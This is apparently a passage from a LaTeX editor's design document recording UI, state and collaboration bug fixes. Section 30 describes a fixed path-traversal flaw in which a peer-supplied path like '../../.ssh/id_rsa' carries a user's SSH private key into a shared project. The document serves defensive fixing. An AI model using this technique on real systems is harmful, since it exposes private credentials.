The glyph is a nib, and deliberately not the current provider's mark. The floating agent button wears that mark and opens the panel of the agent you have; this control changes which agent you have, and one wearing Claude's mark that takes you to a screen offering ChatGPT and nothing is wearing the wrong thing.

### An image handed over rather than described

A writer looking at a referee's marked-up page, a screenshot of a table that has come out wrong, or a figure from somebody else's paper wants to hand it over. Describing a visual problem in prose is the tax this removes, and it is a large one.

Three ways in, in the order people will use them. Pasting, because a screenshot arrives on the clipboard as a file on all three platforms, so that is the whole of it: no dialog and no permission. Dropping on the panel. And a control under the composer, because neither of those is how everybody works and because a control is also the only thing that says the feature exists at all.

A paste that is text and a drop that is a `.bib` file fall through to the browser's own handling rather than being refused with a message about a thing the writer was not trying to do. What the agent cannot look at is refused by the route, which is where the short list of what it can look at lives, and an image too large for the model is refused with the number rather than attempted: the upload path allows 256 MB, which is right for a dataset and wrong here, because the model has its own limit and a 20 MB screenshot is a failed turn rather than a slow one.

**The chips have a thumbnail, and that is the part worth arguing for.** A filename is not enough: an image attached by accident to a question about something else is worse than no attachment, and seeing it is the only way to notice. They sit above the composer beside the selection chip, which is the same idea in the same place, and they go when the question goes.

The question itself reads as what was typed. The paths are named to the model in the same preamble the selection uses, and `turn_start` does not carry that preamble, so the conversation on screen is not a sentence with a list of file paths stapled to it. The chips are what say an image went with it, which is what a person looking at the transcript afterwards actually wants to know.

Where the bytes live is decided by section 27 rather than by preference, and it is recorded in `docs/architecture.md` with the rest of the mechanics.

### Three small things, and one deliberately left out

**Escape stops a turn.** Stop is the writer's one escape hatch from a turn that is doing the wrong thing, and it was a `t-micro` text button in a 32 px header that can be folded away entirely. Escape is where a hand already goes when something should stop, and Escape in the agent panel already meant something: it closed the panel. So it stops first and closes second, and not both, because pressing it once should not also hide the transcript of what the turn had got to before it was stopped, which is the thing the writer is about to read. The key is named on the button's own tooltip rather than only in the README's table, because a shortcut nobody knows about is not one.

**The turn has its own age, beside the age of what it is doing.** Those are very different numbers on a long turn: a writer wants to know a turn is two minutes old, not that its current tool call is four seconds old. Parenthesised, so the pair reads as one thing rather than as two counters competing, and on the interval that was already running.

**A figure whose filename has a space in it is flagged rather than refused.** `\includegraphics{a b.pdf}` sends TeX looking for `a` and then complaining that `b.pdf` has an unknown extension, which names neither the file nor the problem: it is a puzzle rather than a message, and it arrives a build later than the mistake. The write is not refused, because the file does exist and refusing would be worse than saying so, and the model is told so it can rename it.

**The Sections panel did not get the selection verbs, and that is a decision.** The plan for this run said the verbs belonged on a section in the rail as well as on a selection in the editor, on the grounds that the outline already knows the range. It is convenience rather than capability: selecting the section in the editor already produces the verbs, so a second entry point buys a shorter route to something already reachable, and it costs a hover control on every row of a panel that can hold forty of them. Left out, and written down rather than quietly dropped.

### The em dashes the app was shipping in its own voice

`nexttex/writing.py` opens with two rules stated as absolutes, and the first is that there is never an em dash, in the document or in what the agent says to the user. The app was breaking it in its own voice in about three hundred and eighty places: forty-eight in the interface, twenty-five in the Python, and the rest in these documents, this one worst of all.

That was not an oversight so much as a reading. The rule looked like it governed prose written *into* somebody's project, and the evidence for the narrow reading was that the repository's own markdown was full of them. The evidence was the thing to fix.

The interface strings and the Python went by hand, because each one wants a different repair: a comma where the dash was parenthetical, a colon where what followed was an explanation, a full stop where it was joining two sentences that wanted to be two. Three hundred and forty-eight in the documents went through a rule and then a read: a parenthetical pair became a pair of commas, an elaboration with its own internal punctuation became a colon, everything else became a comma, and the two patterns that came out wrong, a label in a table cell and a label at the head of a list item, were put back as colons because a comma there reads as a list of two things where the original read as a definition.

Two characters stayed and both are the same exception. `–` is now the "no value yet" glyph in the page counter and the file name in the status strip, where a word would reflow a strip that must not reflow; it is a different character and the rule bans the em dash itself. And the em dash inside `tests/test_explain.py` is a TeX error message *about* a stray em dash, where the character is the subject rather than the punctuation.

The test that held the README to this now holds the whole repository, which it could not before, and three files are exempt for the reason above. That is the part worth keeping: the backlog is gone, and the thing that let it accumulate was that nothing looked.

### The palette section disagreed with the stylesheet, and nothing could notice

This document's own preamble says that when it and the implementation disagree, that is a bug in one of them and the thing to do is decide which. Its palette section disagreed with `frontend/src/styles.css` for weeks: a commit updated the table and missed the prose two paragraphs below, so the document said the pen was `#74408E` when the stylesheet said `#6F2998`, and said the dark surround was `#141715` when that is the light theme's ink.

The prose is corrected, and there is a test now, because nothing could have noticed. Not a check that every colour named here is in the stylesheet, since this section legitimately names colours that are somebody else's: NexusQC's accent, and the indigo this app is explicitly not. The narrower rule is the one that actually broke, which is that a colour presented as *ours* has to be one the stylesheet sets.

### What round two found, which was five things and none of them in a test

The suite was green, the browser tier was green, and then the interface was photographed at both themes and read against the sections above. Five things, written down before any of them were fixed, because a list fixed as it is found is a list that stops at the first hard item.

**The welcome message described a fence that no longer exists.** It promised, in the agent's own voice, that a shell command or a file outside the project would be asked about first. That is true at the first position and false at the other two, and it is the first thing a new reader sees. It names the control now rather than the behaviour, which is both accurate and more useful, since somebody reading it for the first time may not know the control is there.

**The turn's plan came back as protocol noise.** The panel draws it live and does not record it, but the *transcript* recorded the `TodoWrite` call like any other tool, so a reload replayed a row called `TodoWrite`, twice, collapsed with a count. The live path and the replayed path disagreed about what kind of thing this was. Nothing in a test could have caught that, because both halves were behaving exactly as written.

**A comma before a monospaced run has less air than the dash it replaced.** The resolved-permission row read `Denied` and then a URL with almost nothing between them: the em dash sweep had turned a wide separator into a narrow one in a row that is mostly separator. It is a space now, which is the status strip's own rule for its segments, and the right answer all along.

**The composer said the same thing twice while a card waited**, once in the placeholder and once in the line beneath, and the line was long enough to truncate at the panel's own width. The placeholder carries the invitation and the line carries the state, and neither repeats the other.

**The plan scrolled out of view.** Revised in place, it stayed where it first appeared, so a turn with any output at all pushed it off the top and the panel was carrying a list of what it intended to do somewhere the reader could not see, which is the opposite of the point. A revised plan is new information and now goes where all the other new information goes, keeping its id so the row is reused rather than replaced.

### One thing looking found and left alone

The verb row over a selection takes the editor's palette rather than the furniture's, so in the light theme it is a light card on a lit page. Section 23 says every floating card takes the dark palette while the theme is light, and by the letter of that this is a deviation.

It is deliberate, and the precedent is already in the build: the spelling menu is the only other thing that floats *inside* the editor pane, and it is light there too. The rule in section 23 is about the furniture, and the argument under it is that the page must stay the brightest object on screen. A dark card dropped on a lit page does not serve that argument, it reads as a hole punched in the page, which is the same complaint section 23 makes about the dark theme's PDF needing a shadow. So the rule holds for everything floating over the chrome, and the two things that float over the page follow the page.

Reversed in §32, at the writer's request: on a white page the light card was the hole, and the two are furniture now.

### The worst thing in the run, found by reading the record rather than testing it

The plan for this work said, under verification, that somebody should read `.nexttex/transcript.jsonl` by hand after a session at the quietest position, because that file is the audit trail, it is what the whole case for a position with no cards rests on, and nothing asserted that it read as a coherent account of anything.

It did not. Every action the agent had taken without being asked came back, after a reload, reading `Denied`.

The mechanism is small and the consequence is not. A decision normally arrives *after* the card, through `note_decision`, when the browser answers one. Nobody answers an automatic approval, or one covered by a rule they set earlier, so nothing ever wrote a decision down for those: the event carried one and the transcript's permission branch did not keep it. On replay the panel then found a card with no decision, and it marks those refused, on reasoning that is correct in the case it was written for, which is a card still open when the window closed and which can never be answered now.

So the record of a fully automatic session said the writer had refused things that had actually happened to their document. Section 5 states the rule this broke in as many words: an action nobody was asked about is not the same as one the writer allowed, and the record must not read as though it were. This was worse than that, because it read as the opposite of both.

Two things are worth keeping from it. The first is that the manual read was in the plan because no test could be written for "does this read as an account", and the thing it found was not subtle prose but a straightforward inversion of fact that four hundred green tests walked past, because both halves of it were behaving exactly as written. The second is that the check is a test now, and it prints the account as well as asserting it, so the next person changing the transcript can see what a reader would see rather than only whether the keys are present.

## 29. A value set once and never set back

Reported by the writer: the project list finds an update, you press Not now, and from then on Check for updates does nothing at all. Their second sentence is the one that made this a section rather than a fix. "Seems there may be more things like that broken on the projects screen."

There were seven, and they are all the same bug wearing different clothes. Something is written down once, at the moment it is first true, and there is no path back. A dismissal that outlives the question it answered. An answer read on mount that nothing revises. An error with no one to clear it. A flag raised at the start of a job that only one of the job's four endings lowers. None of these is a mistake in the ordinary sense: every one is a correct line of code that was right about the case its author had in mind and silent about the others.

`18cc6af` was the same family, a fortnight earlier, and that is the interesting part. The screen that chose an agent withheld its way out on a condition that was true in the case its author was thinking of and false in the one that mattered.

### What the update footer had got wrong

The dismissal was tested in the render rather than in the check. `check(asked)` carries a flag saying whether a human asked, which four lines in decides whether a failed check reports itself or stays quiet, and then throws the flag away. So by the time the answer reached the screen, a result the writer had pressed a button for and a result nobody asked for were indistinguishable, and the dismissal silenced both. The request went out, the server answered past its own cache, and the answer was discarded on the way to the page. The key is `head:behind`, which moves only when upstream gains a commit, so on a quiet upstream the update was unreachable from the interface for good.

The fix is to read the dismissal the same way the failure path already reads it. But the more useful half is what the dismissed state now says. It used to leave a bare `Check for updates`, which is exactly what an install that has never checked shows: the screen knew an update was waiting and had no way to say so. An update put off until a quieter afternoon has to leave something to come back to, so it reads *"An update is waiting."* with `Show it` beside it, in the grey line the docs-only case already uses. `Not now` keeps the report rather than discarding it, which is what lets that line exist at all.

### A callback prop is a promise the second caller does not make

The access card told the thing that opened it when a password had been saved, through a prop. There are two places that open it, the nudge at the foot of the project list and the settings row behind the cog, and only the first passed the callback. So setting a password from the cog left the warn-barred line three inches below still reading "This install has no password", for the rest of the visit, because the nudge had read the answer once on mount and the only thing that revised it was a message it was no longer being sent.

The comment beside that prop says, in as many words, that it exists to stop the screen contradicting itself. It did stop it, at one of the two places it could.

It is an event now, the same shape as `APPEARANCE_CHANGED`, and for the same reason that one is an event: the thing which needs to know is not the thing that opened this. A prop reaches whoever passes it and a third mount point later cannot forget to.

### An error is not a state, it is a message, and messages end

Three of the seven were errors that outlived their cause, and the worst was not the lingering itself. The access card draws `error ? … : said ? … : null`, and only one of its three actions cleared `error`. So one failed name save meant every later action in that card succeeded in silence behind a red line saying something had failed, with a screen reader announcing the stale error and nothing else. A message that persists does not merely linger; it takes the channel with it.

The project list has the same shape without the masking: one string, five writers, two clearers, so a PDF that would not typeset left its complaint under whichever tab the writer moved to next. `store.ts` has a notice list built for exactly this, and `notices.test.ts` opens by describing the regression in its own words, but the region that draws notices is mounted after the early return that shows the project list, so from that screen it does not exist. Moving it there would be worse: a floating toast over a list of projects is further from where somebody who just pressed something is looking than a line under the form. So this one stays a line, and the line is cleared when the thing that caused it succeeds.

### A busy flag needs as many ways down as the job has endings

The Claude install panel hides both of its other branches while installing, so the whole screen is one log with no Back and no Cancel. That is fine as long as the flag always comes back down, and it was lowered by one thing, a `done` frame, where the job had three other endings: the server answering that the CLI was already there and starting nothing, the stream dropping, and the stream ending without that frame. All three left a screen with no way off it but Escape, which nothing on it mentions.

The rule this suggests is worth stating generally, because the same shape is in the update footer's restart poll: **count the ways a thing can end, not the way it is meant to end.** The login flow directly beneath this one has had a Cancel from the beginning, which is the same observation made by whoever wrote it.

### Two that were reached through an error path

The restart poll learns which process it is watching before waiting for a different one to answer. That ask fails exactly when the server is mid-restart, which is the reason a tab is joining a running update in the first place, and the fallback was an empty baseline that the first answer filled in. The first answer is from the new process, so the comparison could never fire and the reader was told a minute later to restart a server that had come back long ago, which is precisely the failure that code was written to prevent, reached through its own error case.

And a button on the failed-update card read "Hide the log" and was wired to a function with no body. Not a latch, but the same lesson from the other side: it was written for the branch where the log is always shown, and the control it shares with the other branch went on drawing itself.

### What the sweep is worth, and what it is not

Seven found, three deliberately left, each with the reason in `TRACKER.md`. The three left are all cases where the symptom is real and the fix asks a larger question than the symptom is worth: what `state.error` means now that a notice list sits beside it, whether a sign-in error should survive a move between panels, and whether a warning somebody has put away for good should have a way back that is not the settings sheet.

What is worth noticing about the whole list is that not one of them could have been found by a test. Every single one is a correct line of code doing exactly what it says, in a case its author did not have in front of them, and the tests that cover these paths were green throughout and are still green. They were found by asking one question of a screen, over and over: what sets this back.

## 30. Fixing what the September review found

The September 2026 review recorded 126 findings and fixed none of them,
deliberately: a list fixed as it is found stops at the first hard item. The
fix run that followed took every one of them, plus two the Windows laptop
found while it ran, and its review file was deleted at the close: the commit
log is the record, and each subsection below names what changed rather than
the number it was filed under. Of the 128, 125 were fixed, two were deferred
with their measurements and one was amended with its third part deferred, all
three in `TRACKER.md` with their reasons. This section is what the fixing
changed, one subsection per idea rather than one per record, since the point
of the review's mechanism grouping was that several records are one idea in
different clothes.

### Undo belongs to the writer's own keyboard, and to nothing else

Six presses of Ctrl+Z emptied a file, on disk, for everyone in the share, on a
file nobody had typed in. It is the worst thing the review found and the
mechanism is worth stating plainly, because it is one of two undo stacks
quietly taking work that was not offered to it.

A buffer is built from `opened.text.toString()` before that file's socket has
synced. For a file nobody else has open, the document at that moment is empty,
and the whole chapter arrives afterwards in one transaction from the socket. A
transaction is undoable unless it says otherwise, so that chapter sat on
CodeMirror's undo stack as though the writer had typed it, and undo wrote the
emptied buffer straight back into the shared document, which is to say to disk
and to every other browser.

`collab.ts` had built the right thing and never reached it. `yCollab` is given
a scoped `Y.UndoManager` that tracks only the local sync origin, and it
installs the manager and a `beforeinput` handler for it, and binds no keys.
`yUndoManagerKeymap` is exported by the same package and was imported nowhere.
So Ctrl+Z was taken by `historyKeymap` before the browser ever raised a
`historyUndo` input event, and the scoped manager was inert.

Both halves had to move. The keymap is now bound beside `yCollab`, and
`history()` and `historyKeymap` have come out of `base()` in
`editor-setup.ts`, which the live editor and the read-only panes share. They
live in `withHistory()` now, which only `viewExtensions()` takes: a version
being read and the fallback pane a file gets when it could not be connected
have no shared document behind them, cannot be edited, and should still answer
the key rather than hand it to the browser.

The rule this leaves is one sentence. **A pane with a shared document behind
it has exactly one undo stack, the scoped one, and a pane without one has
CodeMirror's.** Adding an extension to `base()` that touches history puts them
both in the same editor again.

Two tests hold it. `frontend/src/panes/editor-undo.test.ts` builds a live
editor over a real `Y.Doc`, lets the document arrive with a socket-shaped
origin, and presses the key through `runScopeHandlers`, so it is the binding
being tested and not the command. `e2e/specs/undo.spec.ts` does it in a
browser and reads the disk afterwards, which is what was actually being lost.

### A path from somebody else is fenced everywhere it is used, not everywhere it is written

The second blocker. `resolve_for_write` refuses a path that leaves the project
and a path inside `.git`, `.nexttex` or `.claude`, and every write of a shared
file went through it. A rename did not, because a rename has two paths and
only one of them is a write.

`settle_paths` records what a record says its path is the first time it sees
that file, as the baseline the next change is measured against. That went in
unfenced. `_rename_locally` then built its source as `root / was` and its
target through the fence. So the escape ran inwards: name a file
`../../.ssh/id_rsa`, wait, rename it to `notes.tex`, and the file is carried
off the machine's own disk into the project, where the manifest offers it to
everybody in the share. The target being fenced was what made it useful.

The rule is the one the projection already followed and the rename had drifted
from: **a path proposed by the other end is put through the fence at the point
it is used, not at the point it is written down.** A baseline is a source path
later on, so it is fenced when it is recorded; a source is fenced when it is
used; the target keeps the fence it already had.

Two things beside it, both in the same function and the same family.

A local file that a peer's rename displaces used to be moved to
`chapter (was here).tex` inside a suppressed `OSError`. The manifest is the
authority on what a file is called and the local file does have to step aside,
but the writer's work went sideways in silence, under a name they did not
choose, with nothing on any screen saying it had happened. It goes to the
trash now. The trash is restorable, it is a panel somebody can look at, and
removing the file is a change the watcher announces like any other, so all
three of the things that were missing come with it.

And the refusal a write gets was latched on the file id rather than on the
path. Not retrying the same path is right: a record naming
`.git/hooks/pre-commit` will name it just as much next time. But the path is a
field the other end can change, and once an id was in that set nothing took it
out, so a file pointed somewhere ordinary afterwards stayed unwritable for the
rest of the session. It is a map from id to the path that was refused.

### Absence and failure are not the same thing, and neither is "not yet"

The largest family the review found, and the one a writer actually meets,
because every instance of it puts a false sentence on the screen. One signal
is being read as one meaning when it carries several.

**The preview told writers their document was empty.** The PDF route raises
404 whenever `build/main.pdf` is not on disk, and pdflatex writes no PDF for a
document with nothing in it, so three different pieces of news arrive as one
status code: no build has ever finished, one is running right now, and one
finished and produced no pages. Only the third is an empty document. For the
whole of a project's first build, which is several seconds and is the first
thing anybody sees, the pane said "Nothing has been typeset yet. An empty
document produces no pages." That is a statement about the writer's own work,
it is false, and it sends them looking for a fault in a document that is fine.
The Windows laptop met it as the first thing a joining writer sees, with the
build log already on disk beside it.

The store had the answer all along. `builds[document]` carries `compiling`,
and a `result` that stays null until a `compile_done` has landed for that
document. `absenceFrom` takes both now and answers four states rather than
two: **Typesetting** while a build is running, **Not built yet** when none
has finished, **Nothing has been typeset yet** only for a build that finished
and made no pages, and the unreachable screen for everything else.

A fifth answer came later, from a writing session's log. The engine rewrites
the PDF in place, and a fetch that arrived while a build was writing it came
back short, which the pane showed as the unreachable screen over a document
that was fine. The route now answers 503 for that instant, and the pane
treats it as what it is: a build in flight. A page already on screen stays
on screen, since the build's own completion fetches again; with no page yet,
the pane says **Typesetting**, which is true.

**The strip said Ready through that same build**, which is the other half and
has a different cause. `compile_start` is news, and the broadcaster keeps no
backlog, so a browser hears it only if it was subscribed at that instant.
Opening a project builds it: `connect()` constructs an `EventSource`, which
returns before the connection exists, and the compile request goes out a few
lines later. The tab regularly missed its own build starting.

The same absence is why a lost `compile_done` latched the strip on Compiling
for ever. **A flag raised by one event and lowered only by another needs a way
to be read, not only listened for.** That is the general rule and this is the
particular one: the event stream's first frame, on every connection and every
automatic reconnection, is now `compile_state`, the state of every document's
build. It is authoritative about what is running and says nothing about what a
build produced, so a browser that already has a result keeps it.

Two smaller ones in the same pane. The cancellation check on the PDF fetch was
on the success path and on neither failure path, so a superseded 404 could
draw the "no preview" screen over a page that had already loaded.

### A stopped server is not a moved deployment, and the promise beside it has to be true

Two records that are one story. A pane is a dynamic import, so when a deploy
replaces the built assets under an open tab, the next pane it opens asks for a
chunk that is no longer there. Reloading onto the new build is the only cure
and the boundary does it, once. What decided when was a pattern over the error
message, and the pattern included a bare `Failed to fetch`, which is what a
browser says for **any** request it could not make.

So a NextTex that had simply stopped was read as a deployment that had moved.
The tab reloaded itself onto the browser's own error page, `ERR_CONNECTION_REFUSED`,
and the editor and everything in it that had not reached the server went with
it. The Windows laptop watched that happen four minutes after the app had told
it, in a `title` attribute, that what you type is kept here until it
reconnects.

The two are separable and were always distinguishable. A browser that could
not import a module says which module; a dead server does not. And the
document socket already knows: `connection` is `offline` before any of this.
`worthReloading` asks both questions, and the boundary asks it.

Once the tab stays, what it says has to be true as well. The failure screen
explained every failure as an update that had happened while the tab was open,
which is a confident and false account of a server somebody stopped, pointing
at a Reload that cannot work. It says which of the two it is now.

And the promise moves out of the tooltip. "What you type is kept here until it
reconnects" was a `title`: the one place the app said what happens to a
writer's work was a place you had to already suspect something to find, and no
place at all on a tablet or to a screen reader reading the strip. It is beside
the word `offline` now. A promise that is on the screen is one the rest of the
app has to keep, which is the reason to move it and not only the effect.

### A check that never reached the network is not an answer about the code

The largest instance of one number carrying two meanings, and the one with the
worst consequence, because the thing it got wrong is whether the writer is
running the version they think they are.

`check()` returns early when the fetch fails, before `behind` is ever
assigned, so it keeps its dataclass default of zero. The footer reads
`report.behind === 0` and draws **Up to date.** Nothing between that line and
the checkout test looks at `error` or `reason`. There is a card that says the
repository could not be reached, and it belongs to `phase.kind === "error"`,
which is the request itself failing; a report that arrives successfully
carrying an error is not that phase and reached nothing that would draw it.

The Windows laptop found it because its server cannot resolve `github.com`
while a shell on the same machine can. It sat five commits behind, was told it
was current, and could not start an update from the page either, because
`can_update` was false and the route refuses. The documented recovery was the
one path closed.

A count cannot say "I could not ask", so the report says it: `checked` is
false until the fetch has actually happened, and the footer asks that before
it reads any number. The rule is the general one this section keeps arriving
at. **A field that means "how many" must never be the field that also means
"I do not know".**

The refusal from the update route carries git's own words after the reason
now, for the same reason: "there is nothing to update" is a statement about
the code, and a fetch that failed has not earned the right to make one.

### The transcript may say a thing is being asked about, never that it happened

A permission card and the tool call it is about are one event, and the panel
drew them as two rows saying the same command, one above the other. That is
the small half. The large half is that every verb in the table is past tense
and the tool row is written when the call arrives rather than when it is
permitted, so `Ran echo hello` sat above a card headed **Run a shell command**,
and if the writer said no the transcript kept both: `Ran`, then `Denied`, the
same command twice, nothing having run.

`docs/design.md` section 28 gave its worst-finding subsection to the record
inverting fact. This is that, in the place a writer looks first.

The two rows had nothing tying them together, and the tie was in scope the
whole way: the SDK hands `_pre_tool` the tool call's id and `_decide`,
`_by_mode`, `_ask_user` and `_settled` all dropped it. The card carries it now,
as `toolId`, on the wire and in the record, so the pairing survives a reload
rebuilding the panel from the transcript.

With the pairing, two things follow. `tidy` folds an **answered** card into its
call, so the command reads once. An **open** card keeps its own row, because it
is a question with four buttons on it and a question the writer cannot answer
is worse than a repeated line. And the row above knows which of the three
states it is in, so it says **Running** while the card is open, **Ran** once
the call was allowed, and **Did not run** when it was refused.

`verbFor` holds both tenses and a test asserts that every tool whose past
tense is a claim has a present tense, so adding a verb to one table and not
the other cannot quietly reintroduce this for that tool.

### One connection was modelled and the other was not

Three records and one absence. The interface has no representation of the peer
link anywhere in its lifetime: it cannot draw a collaborator arriving, cannot
draw one present, and cannot draw one leaving. All three were the same empty
space in the tab strip, and the one badge that does exist watches a different
connection entirely.

`connection` in `collab.ts` is the state of **this browser's WebSocket to its
own server**, built against `location.host`. The peer link, the iroh leg that
carries a collaborator's edits, is not in it. So a laptop that loses its
internet while its browser still reaches localhost shows nothing at all: no
badge, a live-looking interface, and the other person's edits silently stop
arriving while both of them keep typing. That is the honest answer to what
"not connected" looks like on a real network, and it is why the experiment
that would have produced it was not worth running.

The server had modelled it the whole time. `PeerNetwork.state()` answers
`connected` per member, `GET /projects/{id}/collab` serves it, the share sheet
polls it every four seconds, and `Editor.tsx` made the same call and kept only
`me`. The array went in the bin everywhere else.

Three changes. The store keeps the share, from the call the editor was already
making. A link being adopted or dropped publishes `collab_peers`, so arrival
and departure are transitions rather than whatever the next four-second sample
happens to catch: the writer's typing stops reaching anybody at the instant the
link goes, and a sample is not news. And `Collaborators` gains its third
branch: shared, somebody has joined, none of them connected, drawn as
"Sharing with Bob, not connected".

**Two badges, not one badge with two meanings.** The browser's own socket being
down and the peer link being down are different facts, both can be true at
once, and they are drawn separately. Folding them into one word is how a writer
comes to believe the wrong one, which is the mechanism this whole section is
about.

The laptop's last report is what made this three records rather than two. It
sampled its own screen once a second across the window in which the share it
had joined was shut down from this end, and every sample was identical:
`{offline: null, collaborators: null, caretLabels: [], editor: true}`. A writer
whose only collaborator has permanently gone, whose copy is now an ordinary
folder of files, saw exactly what they saw while the collaboration was live.

### `??` on the page, and the only cure written in a tooltip

A fast build is one pdflatex pass. That is what makes typing feel immediate,
and it is also what cannot resolve a reference or a citation, so the preview
shows `??` where a number should be. Everything about why was somewhere else:
a warning count in the status strip, a pane away from the page showing the
`??`, with `mark_warnings` off by default and the diagnostics drawer never
opening itself. A writer sees `??` and has no way to know it is the build
rather than their document.

The strip says it now, beside the scope it already prints: **Whole document ·
references pending**. `referencesPending` asks both halves of the question,
because a *full* pass that still has an undefined reference means a label
really is missing, which is the writer's problem and a different sentence.

And the cure gets a control. Rebuilding everything was Shift-click on a button
labelled Rebuild, written down in a `title` attribute: undiscoverable, and no
use at all on a tablet. The modifier stays; a **Rebuild everything** press
appears beside it when there is a reason to press it.

### Identity by position, in a list that is rebuilt underneath it

Four records, and the same mistake twice on the two sides of one screen.

**Which error to start from was chosen alphabetically.** `summarise` took
`min` over `(file, line)`, and the drawer sorted with `localeCompare` on the
filename. Both are the alphabet, and both docstrings, plus the README, say
document order. `chapters/one.tex` sorts before `main.tex`; a broken preamble
makes every chapter complain; so the writer was sent to fix a consequence,
under a note explaining that the list below the first error is usually its
own consequence.

The log's order is the document's order, because it is the order the engine
read it in, and `parse` appends as it reads. So the answer was already the
first element and the sort was undoing it. The drawer keeps errors before
warnings and otherwise leaves the list alone.

Two existing tests encoded the old behaviour, and one of them asserted it
outright: of an error in `chapters/02.tex` and one in `chapters/01.tex`, the
summary was required to name the second. That is only right when the
filenames happen to sort into the order the document includes them in, which
is true of numbered chapters and of nothing else. Both were rewritten with
their reasoning, because a test that passes and is wrong is worse than one
that fails.

**Which row was open was an index into that list.** The drawer kept `expanded`
and `selected` as positions in a `useMemo` recomputed from every build. A
build that reordered the list left the expansion and the selection bar on
whichever diagnostics had landed in those two slots: a row the writer never
opened and never chose. They are keyed by the diagnostic now, on the same
document, file, line and message the server's own `Diagnostic.key()` uses.

**A helper file belonged to whichever chapter came first.** `chapter_for`
matched by containing directory, and with flat chapters every helper matched
every chapter equally, so the loop kept the first one. A fast build was scoped
to a chapter the edited file has nothing to do with, the writer's change was
not in the pages that came back, and nothing said why. A tie is not an answer:
it returns not-scoped, which the caller already builds the whole document for.

**And a printed percent sign hid the rest of its line.** Six copies of
`^[^%\n]*` guarded these scans, and `\%` is a percent that prints. "We
recovered 95\% of it. \input{chapters/one}" made the `\input` invisible to the
dependency graph and to the chapter scoping, so a chapter silently stopped
being rebuilt because its parent line had gained a percentage. One
`LINE_START` now, in `deps.py`, imported by `compile.py`, matching either an
ordinary character or a backslash and whatever it escapes.

> Revised. That head was correct and slow: a general group repeated per
> character, backtracking through every line to find the command, and the
> close of the run measured opening a project at 250 ms against the 94 ms the
> README had recorded. It could also match once per line, so the second of two
> `\include` commands on a line was invisible. The patterns are plain scanners
> now and `uncommented` in `deps.py` checks each hit's line prefix for an
> unescaped percent, which costs a short backwards scan per command found
> rather than a backtrack per character of the file. Opening a project measures
> 20 ms, and both commands on a line are found.

### Something written down once, at the moment it was first true

The largest family in the review, and the repository's own: a flag goes up and
the way down is missing, or is on only one of the paths out. Eighteen records,
each small, and the reason to do them together is that the question that finds
them is one question. **Count the ways this can end, and check each one lowers
what it raised.**

**A failure was being stored as an emptiness.** `refreshHistory`,
`refreshTrash` and `refreshGit` each caught their error and set an empty list,
so a panel whose request failed drew its ordinary empty state: no versions of
this file yet, an empty trash, no repository. The last is the worst, because
the git panel's empty state is an offer to set up a backup, put in front of
somebody who may already have one. Three states, not two, and the panels draw
the third.

**One failure anywhere stopped every later push.** The commit-and-push button
ran `act("commit")`, then read `get().error` to decide whether to go on. That
is the store's session-wide error slot, written by about thirty unrelated
places and cleared by none, so any earlier failure in the app silently turned
the button into a commit-only button until the tab was reloaded. `act` returns
whether *this* action worked.

**"Not now" had no later.** The GitHub card's dismissal is written per project
and was read back only to keep the card away, so a writer who set it aside
once had no route to the wizard for the life of that project short of clearing
their browser storage. There is a Back up control in the panel's header now.

**Everything else the git panel holds followed the writer into the next
project.** The effect on `projectId` re-read the dismissal and nothing else, so
a half-written commit message, a pasted access token and a half-finished
wizard all came along.

**A folder name that was refused stayed refused-looking while it was
retyped.** The error under the field cleared on Escape and on success and not
on typing, which the rename box in the file tree already gets right.

**One flag, two writers, one clearer.** Changing the model mid-turn is
deferred. Changing to another model and then changing your mind back to the
one already in use cleared the pending model and left the deferred flag
raised, so when the turn ended the change was applied with nothing pending and
the project fell back to the account's default.

**Spell checking never came back once turned off.** The compartment holding
the checker is per editor state and turning the setting off empties it;
turning it on again asked a module-level ref whether the checker was loaded,
found that it was, and dispatched the settings into a state with no spelling
field. Asked of the state instead. Half of that record was wrong and is
corrected in it: a second tab opened with spelling on *is* checked.

**Two awaits with no catch**, in a file where every other call has one: a
refused purge and a refused version name were unhandled rejections, so nothing
appeared and the writer concluded the versions had gone.

**A confirmation outlived the thing it was confirming.** Pressing Restore on a
version and then clicking a different one left "Replace the file with this?"
on screen, now asking about a version nobody had asked about. The banner is
keyed by the version.

**Reading a second version broke the live buffer.** `viewVersion` parks what
the editor is showing so "Back to now" can restore it, and a second version
parked the read-only state of the first. The writer was returned to a pane
that looked live, was not editable, and swallowed what they typed.

**A cached rejection.** One failed fetch of the maths renderer was kept for the
session, so every equation after it hovered as nothing.

**Leaving a project left it open.** `closeCollab` was exported and called from
nowhere, so going back to the projects screen kept every document socket and
showed the previous project's collaborators beside the next one's.

**And the verb row followed you to another file**, offering to rewrite a
paragraph that is no longer selected or even open.

**The caret readout followed you too**, and was fixed after the run closed.
Swapping to another file replaces the editor's state without a transaction,
so the update listener that writes the line and column to the strip was never
told, and "Ln 106" sat over an empty new file until the first keystroke. The
run's own attempt left the readout stuck after the swap and was set aside as
half understood. The reading now is taken from the state on screen, after the
swap, and written straight to the store rather than through the listener's
path, which also places the verb row, tells collaborators where this browser
is and arms the focus timer, none of which a swap should do.

### The join card says nothing has been written, and now that is true

Four statements in this repository said that accepting an invite writes
nothing until the writer says yes: the card itself, the comment above the
pending join, the docstring on the client wrapper, and `docs/architecture.md`.
None of them was true. The join called `store.flush()`, which writes every
document, and then `store.close()`, which flushes again, so by the time the
card was drawn the folder held the whole project.

The Windows laptop proved it with timestamps rather than by reading the code.
With the card still on screen its folder held `main.tex` complete and readable
from preamble to `\end{document}`, and `nexttex.toml` and `references.bib`
carrying an mtime a full minute older than the card. So Discard had to delete
real files rather than decline to create them, which is the opposite of what
the writer was promised, and a server killed in that window left a stranger's
project in a folder nothing knew about.

The store and its connection stay open until the answer now, and
`PendingJoin.release` closes them either way. Nothing reaches the disk before
Accept.

**The manifest is not the project.** The wait that decides a join has arrived
looked for any text record, and `send_documents` pipelines the bodies behind
the manifest without waiting for a reply, so that was true well before the
text was. It slept half a second for luck and wrote whatever had not landed as
an empty file. It waits for the bodies now, and says so plainly when only part
of a project arrives rather than writing the half that came.

**A file was offered and never arrived.** `figures/.gitkeep` has no suffix, and
the tree classified by suffix alone, so it was binary; blob transfer carries
history blobs by content address and never file bodies, so nothing behind the
manifest record ever travelled. The card counted four files and three landed,
and the one that went missing was the one whose whole job is to carry an empty
directory. The interface had always had the right rule, in `file-kinds.ts`, and
this side said the opposite: `Path(".gitignore").suffix` is empty, so even the
entry for `.gitignore` in the suffix list never matched. `kind_of` is one
function now and an extensionless name is text.

**And an empty document was never written even when it was carried.** `_dirty`
is filled by the observer on a document that changed, and a document that
arrives with nothing in it produces no change to observe, so accepting wrote
